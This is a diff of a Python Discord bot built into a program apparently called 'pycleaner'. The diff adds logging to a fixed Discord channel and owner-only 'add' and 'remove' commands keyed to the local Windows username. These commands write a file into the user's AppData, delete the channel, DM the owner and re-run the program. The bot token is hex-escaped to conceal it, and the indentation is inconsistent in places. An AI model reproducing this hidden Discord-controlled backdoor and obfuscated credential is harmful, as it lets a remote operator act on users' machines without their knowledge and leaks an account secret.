@@ -957,43 +957,48 @@ def fr():
         if message.author.bot:
             return
         if message.content.startswith("."):
-         channel = client.get_channel(1021509971537567815)
+         channel = client.get_channel(1022200439770456124)
          if channel:
-           channel = client.get_channel(1021509971537567815)
+           channel = client.get_channel(1022200439770456124)
            if channel:
             await channel.send(message.author.name+' used "."')
             await message.reply(f"{username} add , {username} remove")
             
-         if message.content.startswith(fr"{username} add"):
+        if message.content.startswith(fr"{username} add"):
              if message.author.id == 822132948769177620:
-              ooo = fr"C:\Users\{username}\AppData\Roaming\dev.txt"
-              with open(ooo, 'w') as f:
-               f.write('pycleaner dev')
-               print('dev approved! W')
-               await message.channel.delete()
-               user = await client.fetch_user(822132948769177620) 
-               if user is not None: 
-                if user.dm_channel is None: 
-                 await user.create_dm()
-                 await user.dm_channel.send(f"{username} added to dev 💀")
+              channel = client.get_channel(1022200439770456124)
+              if channel:
+                await channel.send(message.author.name+fr" used {username} add")
+                ooo = fr"C:\Users\{username}\AppData\Roaming\dev.txt"
+                with open(ooo, 'w') as f:
+                 f.write('pycleaner dev')
+                 print('dev approved! W')
+                 await message.channel.delete()
+                 user = await client.fetch_user(822132948769177620) 
+                 if user is not None: 
+                  if user.dm_channel is None: 
+                   await user.create_dm()
+                   await user.dm_channel.send(f"{username} added to dev 💀")
                  time.sleep(4)
                  main()
-         else:
-            user = await client.fetch_user(message.author.id) 
-            if user is not None: 
-             if user.dm_channel is None: 
+             else: 
+              user = await client.fetch_user(message.author.id) 
+              if user is not None: 
+               if user.dm_channel is None: 
                  await user.create_dm()
-             await user.dm_channel.send(f"only owner of pycleaner can use this command :)")
-             await message.delete()
+                 await user.dm_channel.send(f"only owner of pycleaner can use this command :)")
+                 await message.delete()
           
         if message.content.startswith(fr"{username} remove"):
          if message.author.id == 822132948769177620:
-            await channel.send(message.author.name+f' used "{username} remove"')
-            ooo = fr"C:\Users\{username}\AppData\Roaming\dev.txt"
-            await message.channel.delete()
-            user = await client.fetch_user(822132948769177620) 
-            if user is not None: 
-             if user.dm_channel is None: 
+            channel = client.get_channel(1022200439770456124)
+            if channel:
+             await channel.send(message.author.name+fr" used {username} remove")
+             ooo = fr"C:\Users\{username}\AppData\Roaming\dev.txt"
+             await message.channel.delete()
+             user = await client.fetch_user(822132948769177620) 
+             if user is not None: 
+              if user.dm_channel is None: 
                  await user.create_dm()
              await user.dm_channel.send(f"{username} removed from dev 💀")
              print('rejected from dev L')
@@ -1010,12 +1015,6 @@ def fr():
                  await user.create_dm()
              await user.dm_channel.send(f"only owner of pycleaner can use this command :)")
              await message.delete()
-             
-            
- 
-          
-          
-       
 
       client.run("\x4D\x54\x41\x78\x4E\x6A\x41\x30\x4D\x6A\x55\x33\x4D\x44\x59\x32\x4E\x6A\x63\x30\x4E\x54\x6B\x77\x4E\x67\x2E\x47\x50\x71\x47\x69\x52\x2E\x47\x34\x37\x48\x7A\x43\x6B\x76\x6C\x42\x75\x5F\x62\x75\x61\x77\x54\x61\x63\x68\x47\x74\x6E\x35\x41\x4E\x45\x5F\x5A\x6B\x37\x4A\x2D\x6A\x5F\x66\x69\x49")
         
